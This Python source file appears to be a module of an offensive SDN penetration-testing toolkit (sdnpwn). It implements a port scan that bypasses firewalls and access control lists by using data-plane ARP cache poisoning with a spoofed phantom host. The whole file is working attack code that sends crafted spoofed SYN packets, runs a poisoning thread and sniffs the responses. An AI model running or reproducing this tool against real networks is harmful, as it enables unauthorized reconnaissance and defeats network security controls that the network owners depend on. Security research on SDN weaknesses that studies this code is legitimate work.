
from scapy.all import *
import sys
import signal
from threading import Thread
from time import sleep
import random
import netifaces

try:
  import modules.sdnpwn_common as sdnpwn
except:
  import sdnpwn_common as sdnpwn

import modules.dp_arp_poison as dpap

numsUsed = []
poisoningThread = None
sniffingThread = None

def info():
  return "Performs a firewall and ACL bypassing port scan using the DP ARP cache poisoning technique. This attack requires that the controller floods packets destined for hosts with an unknown network location."
  
def usage():
  
  sdnpwn.addUsage("--iface", "Interface to use", True)
  sdnpwn.addUsage("--target-ip", "IP address of target", True)
  sdnpwn.addUsage("--target-mac", "MAC address of target")
  sdnpwn.addUsage("--ports", "Ports to scan. Seperate with comma (e.g. 22,23,80)", True)
  sdnpwn.addUsage("--phantom-ip", "IP address to give Phantom Host", True)
  sdnpwn.addUsage("--phantom-mac", "MAC address to give Phantom Host")
  
  return sdnpwn.getUsage()

def prepForScan(interface, targetIP, targetMAC, thisHostIP, thisHostMAC, phantomIP, phantomMAC):
  global scanPrepped
  global poisoningThread
  
  sdnpwn.message("Inserting entery for Phantom Host in target ARP cache...", sdnpwn.NORMAL)
  sdnpwn.message("Sending SYN from Phantom (" + phantomIP + ") to " + targetIP, sdnpwn.NORMAL)
  sendTCPSYN(interface, targetIP, targetMAC, getUniqueNum(), phantomIP, thisHostMAC, getUniqueNum(), getUniqueNum())
  
  sdnpwn.message("Waiting for ARP request for Phantom (" + phantomIP + ")", sdnpwn.NORMAL)
  sniff(iface=interface, filter="arp and host " + targetIP, store=0, count=1)
  sdnpwn.message("Done. IP should be in cache", sdnpwn.SUCCESS) 
  scanPrepped = True
  
  try:
    if(poisoningThread == None):
      poisoningThread = Thread(target=dpap.arpCachePoison, args=(interface, targetIP, targetMAC, phantomIP, phantomMAC, thisHostIP, thisHostMAC, True, 2)).start()
  except Exception as e:
    sdnpwn.message("Issue starting poisoning thread", sdnpwn.ERROR)
    print(e)
    exit(0)
  
def scan(interface, targetIP, targetMAC, thisHostIP, thisHostMAC, phantomIP, phantomMAC, targetPort):
  global scanPrepped
  
  if(scanPrepped == None or scanPrepped == False):
    prepForScan(interface, targetIP, targetMAC, thisHostIP, thisHostMAC, phantomIP, phantomMAC)
  sourcePort = getUniqueNum()
  tcpSeqNum = getUniqueNum()
  
  sniffingThread = Thread(target=listen, args=(interface, targetIP, targetMAC, targetPort, phantomIP, sourcePort, tcpSeqNum)).start()
  sleep(1)
  sdnpwn.message("Checking Port " + targetPort, sdnpwn.NORMAL)
  sendTCPSYN(interface, targetIP, targetMAC, targetPort, phantomIP, thisHostMAC, sourcePort, tcpSeqNum)
    
def sendTCPSYN(interface, targetIP, targetMAC, targetPort, srcIP, srcMac, sourcePort, tcpSeqNum):
  ether = Ether(src=srcMac, dst=targetMAC)
  ip = IP(src=srcIP, dst=targetIP)
  tcpSYN = TCP(sport=sourcePort, dport=int(targetPort), flags="S", seq=tcpSeqNum)
  pkt = ether/ip/tcpSYN
  sendp(pkt,iface=interface)
  
def listen(interface, targetIP, targetMAC, targetPort, sourceIP, sourcePort, tcpSeqNum):
   sniff(iface=interface, prn=listenerCallback(interface,targetIP,targetMAC,targetPort,sourceIP,sourcePort,tcpSeqNum), store=0, stop_filter=stopFilter(sourceIP))
   
def listenerCallback(interface, targetIP, targetMAC, targetPort, sourceIP, sourcePort, tcpSeqNum):
  def packetHandler(pkt): #This is the function scapy will use as the callback
    if(TCP in pkt):
      if(pkt[IP].src == targetIP and pkt[TCP].dport == sourcePort):
        flags = getFlags(pkt[TCP].flags)
        if(flags == "SA"):
          sdnpwn.message("Port " + targetPort + " open", sdnpwn.SUCCESS)
        elif(flags == "RA"):
          sdnpwn.message("Port " + targetPort + " closed", sdnpwn.ERROR)
        else:
          sdnpwn.message("Got flags " + flags + " for port " + targetPort, sdnpwn.WARNING)
      return
  return packetHandler

def getFlags(pktFlags):
  flags = ""
  if(pktFlags & 0x01): #FIN
    flags+="F"
  if(pktFlags & 0x02): #SYN
    flags+="S"
  if(pktFlags & 0x04): #RST
    flags+="R"
  if(pktFlags & 0x08): #PSH
    flags+="P"
  if(pktFlags & 0x10): #ACK
    flags+="A"
  if(pktFlags & 0x20): #URG
    flags+="U"
  if(pktFlags & 0x40): #ECE
    flags+="E"
  if(pktFlags & 0x80): #CWR
    flags+="C"
   
  return flags

def stopFilter(sourceIP):
  def stopper(pkt):
    if(TCP in pkt):
      if(pkt[IP].dst == sourceIP):
        return True
      else:
        return False
  return stopper

def getUniqueNum():
  global numsUsed
  
  if(len(numsUsed) > 1000):
    numsUsed = []
  num = random.randint(35000, 60000)
  if(num not in numsUsed):
    numsUsed.append(num)
    return num
  else:
    return getUniqueNum()
  
def signal_handler(signal, frame):
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  #for t in runningThreads:
    #runningThreads.remove(t)
  sys.exit(0)
  
def run(params):
  global scanPrepped
  
  scanPrepped = False  
  conf.verb = 0 #Set scapy verbose mode off
  
  signal.signal(signal.SIGINT, signal_handler)
  
  interface = None
  targetIP = None
  targetMAC = None
  targetPort = None
  phantomIP = None
  phantomMAC = None
  
  if("--iface" in params):
    interface = params[params.index("--iface")+1]
  if("--target-ip" in params):
    targetIP = params[params.index("--target-ip")+1]
  if("--target-mac" in params):
    targetMAC = params[params.index("--target-mac")+1]
  if("--ports" in params):
    targetPort = params[params.index("--ports")+1]
  if("--phantom-ip" in params):
    phantomIP = params[params.index("--phantom-ip")+1]
  if("--phantom-mac" in params):
    phantomMAC = params[params.index("--phantom-mac")+1]
    
    
  if(interface == None or targetIP == None or targetPort == None or phantomIP == None):
    print(info())
    print(usage())
    return
  
  if(targetMAC == None):
    sdnpwn.message("Sending ARP request for target MAC", sdnpwn.NORMAL)
    targetMAC = sdnpwn.getTargetMacAddress(interface, targetIP)
    sdnpwn.message("Got target MAC: " + targetMAC, sdnpwn.NORMAL)
  
  if(phantomMAC == None):
    phantomMAC = sdnpwn.generateRandomMacAddress()
    sdnpwn.message("Generated Phantom host MAC: " + phantomMAC, sdnpwn.NORMAL)
        
  targetPorts = targetPort.split(",")
  
  sourcePort = getUniqueNum()
  tcpSeqNum = getUniqueNum()
  
  thisHostIP = sdnpwn.getIPAddress(interface)
  thisHostMAC = sdnpwn.getMacAddress(interface)
  
  if((thisHostIP == '0') or (thisHostMAC == '0')):
    sdnpwn.message("Invalid interface", sdnpwn.ERROR)
    exit(0)
  
  prepForScan(interface, targetIP, targetMAC, thisHostIP, thisHostMAC, phantomIP, phantomMAC)
  
  while(dpap.isPoisoningComplete() == False):
    sleep(2)
    sdnpwn.message("Waiting for poisoning to complete...", sdnpwn.NORMAL)
    
  sdnpwn.message("Starting port scan", sdnpwn.SUCCESS)
  
  for p in targetPorts:
    scan(interface, targetIP, targetMAC, thisHostIP, thisHostMAC, phantomIP, phantomMAC, p)
  
  sleep(2)
  sdnpwn.message("Finishing up...", sdnpwn.NORMAL)
  dpap.stopPoisoning()
  return
